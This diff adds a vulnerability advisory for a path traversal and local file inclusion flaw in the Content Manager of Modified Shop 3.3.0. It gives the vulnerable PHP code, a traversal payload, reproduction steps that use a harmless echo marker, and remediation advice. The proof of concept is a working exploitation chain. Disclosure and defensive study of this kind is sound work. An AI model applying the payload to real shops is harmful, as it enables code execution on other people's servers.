@@ -1,0 +1,242 @@
+# Path Traversal leading to Local File Inclusion (LFI) and PHP Code Execution in Modified Shop
+
+## Summary
+
+A Path Traversal vulnerability in the Content Manager allows an authenticated administrator to store an arbitrary relative filesystem path in the `content_file` field of the `content_manager` table.
+
+The application later uses this value in a PHP `include()` operation without validating that the resolved path remains inside the intended content directory.
+
+As a result, an attacker with access to the administrative Content Manager functionality can reference files outside `media/content/`. When a referenced file contains PHP code, the server interprets and executes that code during the rendering of the public content page.
+
+The issue was confirmed in a controlled environment using a PHP file uploaded through the application's Filemanager. The uploaded file was stored under `/images/`, referenced through a traversal path, and successfully included by `shop_content.php`. PHP execution was verified through a harmless output marker.
+
+## Affected Product
+
+- **Product:** Modified Shop
+- **Version tested:** 3.3.0
+- **Revision:** 16825
+- **Affected component:** Content Manager
+- **Relevant endpoint:** `/admin/content_manager.php`
+- **Inclusion endpoint:** `/shop_content.php`
+- **Related upload component:** `/admin/includes/modules/filemanager/dialog.php`
+
+## Vulnerability Classification
+
+- **Vulnerability type:** Path Traversal / Local File Inclusion
+- **CWE-22:** Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')
+- **CWE-98:** Improper Control of Filename for Include/Require Statement in PHP Program ('PHP Remote File Inclusion')
+- **CWE-94:** Improper Control of Generation of Code ('Code Injection'), where applicable to the demonstrated PHP execution impact
+- **Impact:** Local file inclusion and PHP code execution in the web application context
+- **CVE:** Not assigned
+
+## Technical Details
+
+### 1. Unvalidated path accepted by Content Manager
+
+The administrative endpoint processes the `select_file` parameter and assigns its value to `$content_file_name`:
+
+```php
+$content_file_name = '';
+
+if ($select_file[$i][$languages[$l]['id']] != 'default') {
+    $content_file_name = $select_file[$i][$languages[$l]['id']];
+}
+```
+
+The application does not validate that the supplied path is restricted to the intended content directory.
+
+The value is subsequently included in the data persisted to the database:
+
+```php
+$sql_data_lang_array = array(
+    // Other content fields...
+    'content_file' => $content_file_name
+);
+```
+
+The record is then inserted or updated in `TABLE_CONTENT_MANAGER` through `xtc_db_perform()`.
+
+The input-processing function `xtc_db_prepare_input()` does not provide filesystem path containment validation. Consequently, a relative path containing directory traversal sequences can reach the database.
+
+### 2. Vulnerable file inclusion
+
+In `shop_content.php`, the application checks whether the constructed path is a file and then includes it:
+
+```php
+if (is_file(DIR_FS_CATALOG.'media/content/'.$shop_content_data['content_file'])) {
+    include (DIR_FS_CATALOG.'media/content/'.$shop_content_data['content_file']);
+}
+```
+
+The check performed by `is_file()` only verifies that the resulting path identifies a file. It does not ensure that the resolved file is located inside `media/content/`.
+
+Therefore, a value such as:
+
+```text
+../../images/teste2.txt
+```
+
+is resolved relative to:
+
+```text
+/var/www/html/media/content/
+```
+
+resulting in:
+
+```text
+/var/www/html/images/teste2.txt
+```
+
+The application consequently includes a file located outside its intended content directory.
+
+### 3. Upload and inclusion chain
+
+During testing, the Filemanager successfully uploaded a text file containing a harmless PHP marker:
+
+```php
+<?php
+echo "RS_UPLOAD_PHP_EXECUTION_CONFIRMED";
+?>
+```
+
+The file was stored at:
+
+```text
+/var/www/html/images/teste2.txt
+```
+
+Direct HTTP access to the uploaded file returned `403 Forbidden`. However, this restriction did not prevent server-side inclusion through the vulnerable Content Manager flow.
+
+The following path was persisted in the `content_manager` record:
+
+```text
+../../images/teste2.txt
+```
+
+When the public content page was requested, `shop_content.php` included the uploaded file and PHP interpreted its contents.
+
+## Proof of Concept
+
+The following steps reproduce the issue in the tested environment.
+
+### Step 1 — Upload a harmless PHP marker file
+
+Using the application's Filemanager, upload a `.txt` file containing:
+
+```php
+<?php
+echo "RS_UPLOAD_PHP_EXECUTION_CONFIRMED";
+?>
+```
+
+In the tested environment, the uploaded file was stored at:
+
+```text
+/var/www/html/images/teste2.txt
+```
+
+### Step 2 — Set the Content Manager file path
+
+Submit the Content Manager form with the following value for the affected language entry:
+
+```text
+select_file[0][2]=../../images/teste2.txt
+```
+
+The application accepted and persisted the path in the `content_file` column.
+
+### Step 3 — Trigger the inclusion
+
+Access the public content page:
+
+```http
+GET /shop_content.php?coID=1 HTTP/1.1
+Host: 172.25.44.135:8080
+```
+
+### Step 4 — Verify PHP execution
+
+The response was inspected for the marker:
+
+```text
+RS_UPLOAD_PHP_EXECUTION_CONFIRMED
+```
+
+The browser-side verification returned:
+
+```json
+{
+  "status": 200,
+  "phpExecuted": true,
+  "markerOccurrences": 1,
+  "responseLength": 46423
+}
+```
+
+This confirms that the uploaded file was included by the application and its PHP code was executed.
+
+## Security Impact
+
+An attacker who can modify Content Manager entries can cause the application to include files outside the intended content directory.
+
+Depending on the files reachable by the PHP process and their contents, this may result in:
+
+- Inclusion of files outside the intended content directory.
+- Exposure of information through the output generated by included files.
+- Execution of PHP code contained in an included file.
+- Compromise of the application under the privileges of the web server process, if an attacker can control the contents of an included PHP file.
+
+The demonstrated upload-to-inclusion chain shows that the application's Filemanager can provide a way to place a PHP-containing file in a location that can subsequently be reached through the vulnerable path handling.
+
+The finding does **not**, by itself, establish operating-system command execution or root-level access.
+
+## Root Cause
+
+The vulnerability results from the combination of:
+
+1. Accepting a user-controlled path in `select_file`.
+2. Persisting the path in `content_manager.content_file` without canonical path validation.
+3. Constructing the inclusion path by concatenating the content directory with the stored value.
+4. Calling `include()` without verifying that the resolved path remains within the permitted directory.
+
+The `is_file()` check does not mitigate Path Traversal because it does not enforce directory containment.
+
+## Recommended Remediation
+
+1. **Canonicalize and restrict paths:** Resolve the candidate path using `realpath()` and verify that it is inside the canonical `media/content/` directory.
+2. **Reject traversal sequences:** Reject paths containing traversal components and absolute paths. This should supplement, not replace, canonical path validation.
+3. **Use server-side file identifiers:** Prefer storing an internally generated file identifier or validated filename instead of accepting arbitrary filesystem paths from the client.
+4. **Restrict inclusion types:** Do not use `include()` for arbitrary uploaded content. If the feature only needs to display text or HTML, read the file as data and render it safely rather than interpreting it as PHP.
+5. **Harden uploads:** Prevent executable content from being uploaded into directories reachable by PHP inclusion and apply appropriate server-side execution restrictions.
+6. **Validate existing records:** Review `content_manager.content_file` entries for paths containing traversal sequences or references outside the intended directory.
+
+## Suggested Validation After Fix
+
+Verify that:
+
+- Paths containing `../` are rejected.
+- Absolute paths are rejected.
+- Symlink and canonical-path bypasses are prevented.
+- Files outside `media/content/` cannot be included.
+- Uploaded `.txt` files containing PHP tags are treated as data and never executed.
+- Existing legitimate Content Manager files continue to work.
+
+## Evidence Summary
+
+| Test | Result |
+|---|---|
+| File uploaded through Filemanager | Confirmed |
+| Uploaded file stored under `/images/` | Confirmed |
+| Direct HTTP access to uploaded file | HTTP 403 |
+| Traversal path persisted in `content_manager.content_file` | Confirmed |
+| Path resolved outside `media/content/` | Confirmed |
+| `shop_content.php` included the referenced file | Confirmed |
+| PHP marker executed during inclusion | Confirmed |
+| Operating-system command execution | Not established |
+
+## Conclusion
+
+The Modified Shop Content Manager contains a Path Traversal vulnerability that leads to Local File Inclusion. Because the included file is processed by PHP, the issue can also result in PHP code execution when an attacker can control or upload the contents of a file reachable through the vulnerable path.
+
+The complete upload-to-inclusion-to-PHP-execution chain was reproduced in the tested Modified Shop 3.3.0 revision 16825 environment using a harmless marker, confirming the vulnerability's impact.
